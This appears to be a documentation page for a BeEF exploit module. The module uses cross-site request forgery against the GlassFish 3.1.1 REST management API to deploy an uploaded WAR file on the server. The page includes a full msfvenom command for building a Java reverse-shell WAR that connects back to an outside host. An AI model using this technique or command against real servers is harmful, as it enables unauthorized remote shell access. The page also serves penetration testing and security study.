## Summary

* **Objective**: Deploys a malicious WAR file on an Oracle GlassFish Server 3.1.1
* **Authors**: Bart Leppens
* **Browsers**: Firefox, Safari, Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/glassfish_war_upload_xsrf)

## Internal Working

sends a POST request with the WAR file encoded as base64 data to the REST API endpoint of GlassFish

`/management/domain/applications/application`

The default file uploaded is just a "hello world" war file. To upload an actual useful payload, one can use ysoserial (https://github.com/frohoff/ysoserial) or `msfvenom`

e.g.
`msfvenom -p java/shell_reverse_tcp LHOST=1.2.3.4 LPORT=8888 -f war > payload.war`

Then encode the .war file with base64 and paste it into the "Base64 of Exploit" field.

## Feedback

